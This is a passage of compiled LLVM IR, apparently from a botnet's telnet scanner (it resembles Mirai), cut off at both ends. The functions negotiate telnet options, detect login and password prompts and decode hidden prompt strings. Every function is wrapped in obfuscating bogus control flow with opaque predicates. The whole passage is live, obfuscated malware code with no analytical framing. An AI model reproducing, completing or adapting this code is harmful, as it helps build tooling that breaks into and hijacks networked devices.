originalBBpart232:                                ; preds = %originalBB30
  br i1 %227, label %236, label %299

; <label>:236:                                    ; preds = %originalBBpart232
  %237 = load i8*, i8** %4, align 8
  %238 = load i32, i32* %5, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 253
  br i1 %243, label %244, label %265

; <label>:244:                                    ; preds = %236
  %245 = load i32, i32* @x.75
  %246 = load i32, i32* @y.76
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %244
  %253 = load i8*, i8** %4, align 8
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  store i8 -4, i8* %256, align 1
  %257 = load i32, i32* @x.75
  %258 = load i32, i32* @y.76
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %295

; <label>:265:                                    ; preds = %236
  %266 = load i8*, i8** %4, align 8
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds i8, i8* %266, i64 %268
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 251
  br i1 %272, label %273, label %294

; <label>:273:                                    ; preds = %265
  %274 = load i32, i32* @x.75
  %275 = load i32, i32* @y.76
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %273
  %282 = load i8*, i8** %4, align 8
  %283 = load i32, i32* %5, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8, i8* %282, i64 %284
  store i8 -3, i8* %285, align 1
  %286 = load i32, i32* @x.75
  %287 = load i32, i32* @y.76
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %294

; <label>:294:                                    ; preds = %originalBBpart240, %265
  br label %295

; <label>:295:                                    ; preds = %294, %originalBBpart236
  br label %296

; <label>:296:                                    ; preds = %295
  %297 = load i32, i32* %5, align 4
  %298 = add nsw i32 %297, 1
  store i32 %298, i32* %5, align 4
  br label %217

; <label>:299:                                    ; preds = %originalBBpart232
  %300 = load i32, i32* @x.75
  %301 = load i32, i32* @y.76
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %299
  %308 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %309 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %308, i32 0, i32 1
  %310 = load i32, i32* %309, align 8
  %311 = load i8*, i8** %4, align 8
  %312 = call i64 @send(i32 %310, i8* %311, i64 3, i32 16384)
  %313 = load i8*, i8** %4, align 8
  %314 = getelementptr inbounds i8, i8* %313, i64 3
  store i8* %314, i8** %4, align 8
  %315 = load i32, i32* %3, align 4
  %316 = add nsw i32 %315, 3
  store i32 %316, i32* %3, align 4
  %317 = load i32, i32* @x.75
  %318 = load i32, i32* @y.76
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart252, label %originalBB42alteredBB

originalBBpart252:                                ; preds = %originalBB42
  br label %325

; <label>:325:                                    ; preds = %originalBBpart252, %146
  br label %326

; <label>:326:                                    ; preds = %325
  %327 = load i32, i32* @x.75
  %328 = load i32, i32* @y.76
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %326
  %335 = load i32, i32* @x.75
  %336 = load i32, i32* @y.76
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %343

; <label>:343:                                    ; preds = %originalBBpart256, %originalBBpart24
  br label %344

; <label>:344:                                    ; preds = %343
  %345 = load i32, i32* @x.75
  %346 = load i32, i32* @y.76
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %344
  %353 = load i32, i32* @x.75
  %354 = load i32, i32* @y.76
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %11

; <label>:361:                                    ; preds = %originalBBpart228, %122, %originalBBpart28, %38, %11
  %362 = load i32, i32* @x.75
  %363 = load i32, i32* @y.76
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %361
  %370 = load i32, i32* %3, align 4
  %371 = load i32, i32* @x.75
  %372 = load i32, i32* @y.76
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  ret i32 %370

originalBBalteredBB:                              ; preds = %originalBB, %17
  %379 = load i8*, i8** %4, align 8
  %380 = load i8, i8* %379, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp ne i32 %381, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %383 = load i8*, i8** %4, align 8
  %384 = load i8, i8* %383, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 255
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %82
  %387 = load i8*, i8** %4, align 8
  %388 = getelementptr inbounds i8, i8* %387, i64 1
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 255
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %123
  %392 = load i8*, i8** %4, align 8
  %393 = getelementptr inbounds i8, i8* %392, i64 2
  %394 = load i8, i8* %393, align 1
  %395 = zext i8 %394 to i32
  %396 = icmp ne i32 %395, 31
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %161
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %178
  %397 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %398 = load i8*, i8** %4, align 8
  %399 = call signext i8 @can_consume(%struct.scanner_connection* %397, i8* %398, i32 2)
  %400 = icmp ne i8 %399, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %199
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %217
  %401 = load i32, i32* %5, align 4
  %402 = icmp slt i32 %401, 3
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %244
  %403 = load i8*, i8** %4, align 8
  %404 = load i32, i32* %5, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds i8, i8* %403, i64 %405
  store i8 -4, i8* %406, align 1
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %273
  %407 = load i8*, i8** %4, align 8
  %408 = load i32, i32* %5, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds i8, i8* %407, i64 %409
  store i8 -3, i8* %410, align 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %299
  %411 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %412 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %411, i32 0, i32 1
  %413 = load i32, i32* %412, align 8
  %414 = load i8*, i8** %4, align 8
  %415 = call i64 @send(i32 %413, i8* %414, i64 3, i32 16384)
  %416 = load i8*, i8** %4, align 8
  %417 = getelementptr inbounds i8, i8* %416, i64 3
  store i8* %417, i8** %4, align 8
  %418 = load i32, i32* %3, align 4
  %_ = sub i32 %418, 3
  %gen = mul i32 %_, 3
  %_43 = shl i32 %418, 3
  %_44 = shl i32 %418, 3
  %_45 = shl i32 %418, 3
  %_46 = sub i32 %418, 3
  %gen47 = mul i32 %_46, 3
  %_48 = shl i32 %418, 3
  %_49 = sub i32 %418, 3
  %gen50 = mul i32 %_49, 3
  %419 = add nsw i32 %418, 3
  store i32 %419, i32* %3, align 4
  br label %originalBB42

originalBB54alteredBB:                            ; preds = %originalBB54, %326
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %344
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %361
  %420 = load i32, i32* %3, align 4
  br label %originalBB62
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

; <label>:15:                                     ; preds = %originalBBpart212, %1
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %134

; <label>:18:                                     ; preds = %15
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  br i1 %26, label %95, label %27

; <label>:27:                                     ; preds = %18
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 7
  %30 = load i32, i32* %5, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %29, i64 0, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 62
  br i1 %35, label %95, label %36

; <label>:36:                                     ; preds = %27
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 36
  %53 = load i32, i32* @x.77
  %54 = load i32, i32* @y.78
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %95, label %61

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = load i32, i32* @x.77
  %63 = load i32, i32* @y.78
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 7
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %71, i64 0, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 35
  %78 = load i32, i32* @x.77
  %79 = load i32, i32* @y.78
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %95, label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 7
  %89 = load i32, i32* %5, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [256 x i8], [256 x i8]* %88, i64 0, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, 37
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %86, %originalBBpart24, %originalBBpart2, %27, %18
  %96 = load i32, i32* %5, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  br label %134

; <label>:98:                                     ; preds = %86
  %99 = load i32, i32* @x.77
  %100 = load i32, i32* @y.78
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %107 = load i32, i32* @x.77
  %108 = load i32, i32* @y.78
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %originalBBpart28
  %116 = load i32, i32* @x.77
  %117 = load i32, i32* @y.78
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %5, align 4
  %125 = add nsw i32 %124, -1
  store i32 %125, i32* %5, align 4
  %126 = load i32, i32* @x.77
  %127 = load i32, i32* @y.78
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %15

; <label>:134:                                    ; preds = %95, %15
  %135 = load i32, i32* @x.77
  %136 = load i32, i32* @y.78
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %134
  %143 = load i32, i32* %6, align 4
  %144 = icmp eq i32 %143, -1
  %145 = load i32, i32* @x.77
  %146 = load i32, i32* @y.78
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %144, label %153, label %203

; <label>:153:                                    ; preds = %originalBBpart216
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %154 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %154, i8** %9, align 8
  %155 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %155, i8** %10, align 8
  %156 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %157 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %156, i32 0, i32 7
  %158 = getelementptr inbounds [256 x i8], [256 x i8]* %157, i32 0, i32 0
  %159 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %159, i32 0, i32 6
  %161 = load i32, i32* %160, align 4
  %162 = load i8*, i8** %9, align 8
  %163 = load i32, i32* %8, align 4
  %164 = sub nsw i32 %163, 1
  %165 = call i32 @util_memsearch(i8* %158, i32 %161, i8* %162, i32 %164)
  %166 = icmp ne i32 %165, -1
  %167 = zext i1 %166 to i32
  store i32 %167, i32* %7, align 4
  br i1 %166, label %168, label %170

; <label>:168:                                    ; preds = %153
  %169 = load i32, i32* %7, align 4
  store i32 %169, i32* %6, align 4
  br label %202

; <label>:170:                                    ; preds = %153
  %171 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %172 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %171, i32 0, i32 7
  %173 = getelementptr inbounds [256 x i8], [256 x i8]* %172, i32 0, i32 0
  %174 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %175 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %174, i32 0, i32 6
  %176 = load i32, i32* %175, align 4
  %177 = load i8*, i8** %10, align 8
  %178 = load i32, i32* %8, align 4
  %179 = sub nsw i32 %178, 1
  %180 = call i32 @util_memsearch(i8* %173, i32 %176, i8* %177, i32 %179)
  %181 = icmp ne i32 %180, -1
  %182 = zext i1 %181 to i32
  store i32 %182, i32* %7, align 4
  br i1 %181, label %183, label %185

; <label>:183:                                    ; preds = %170
  %184 = load i32, i32* %7, align 4
  store i32 %184, i32* %6, align 4
  br label %185

; <label>:185:                                    ; preds = %183, %170
  %186 = load i32, i32* @x.77
  %187 = load i32, i32* @y.78
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %185
  %194 = load i32, i32* @x.77
  %195 = load i32, i32* @y.78
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %202

; <label>:202:                                    ; preds = %originalBBpart220, %168
  br label %203

; <label>:203:                                    ; preds = %202, %originalBBpart216
  %204 = load i32, i32* @x.77
  %205 = load i32, i32* @y.78
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %203
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %212 = load i32, i32* %6, align 4
  %213 = icmp eq i32 %212, -1
  %214 = load i32, i32* @x.77
  %215 = load i32, i32* @y.78
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %213, label %222, label %239

; <label>:222:                                    ; preds = %originalBBpart224
  %223 = load i32, i32* @x.77
  %224 = load i32, i32* @y.78
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %222
  store i32 0, i32* %2, align 4
  %231 = load i32, i32* @x.77
  %232 = load i32, i32* @y.78
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %241

; <label>:239:                                    ; preds = %originalBBpart224
  %240 = load i32, i32* %6, align 4
  store i32 %240, i32* %2, align 4
  br label %241

; <label>:241:                                    ; preds = %239, %originalBBpart228
  %242 = load i32, i32* %2, align 4
  ret i32 %242

originalBBalteredBB:                              ; preds = %originalBB, %36
  %243 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %244 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %243, i32 0, i32 7
  %245 = load i32, i32* %5, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [256 x i8], [256 x i8]* %244, i64 0, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = sext i8 %248 to i32
  %250 = icmp eq i32 %249, 36
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %251 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %252 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %251, i32 0, i32 7
  %253 = load i32, i32* %5, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds [256 x i8], [256 x i8]* %252, i64 0, i64 %254
  %256 = load i8, i8* %255, align 1
  %257 = sext i8 %256 to i32
  %258 = icmp eq i32 %257, 35
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %259 = load i32, i32* %5, align 4
  %_ = shl i32 %259, -1
  %260 = add nsw i32 %259, -1
  store i32 %260, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %134
  %261 = load i32, i32* %6, align 4
  %262 = icmp eq i32 %261, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %185
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %203
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %263 = load i32, i32* %6, align 4
  %264 = icmp eq i32 %263, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %222
  store i32 0, i32* %2, align 4
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.79
  %3 = load i32, i32* @y.80
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 6
  %20 = load i32, i32* %19, align 4
  %21 = sub nsw i32 %20, 1
  store i32 %21, i32* %13, align 4
  %22 = load i32, i32* @x.79
  %23 = load i32, i32* @y.80
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %137, %originalBBpart2
  %31 = load i32, i32* @x.79
  %32 = load i32, i32* @y.80
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %30
  %39 = load i32, i32* %13, align 4
  %40 = icmp sgt i32 %39, 0
  %41 = load i32, i32* @x.79
  %42 = load i32, i32* @y.80
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %40, label %49, label %140

; <label>:49:                                     ; preds = %originalBBpart218
  %50 = load i32, i32* @x.79
  %51 = load i32, i32* @y.80
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %49
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %13, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 58
  %66 = load i32, i32* @x.79
  %67 = load i32, i32* @y.80
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %65, label %117, label %74

; <label>:74:                                     ; preds = %originalBBpart222
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 7
  %77 = load i32, i32* %13, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %76, i64 0, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = icmp eq i32 %81, 62
  br i1 %82, label %117, label %83

; <label>:83:                                     ; preds = %74
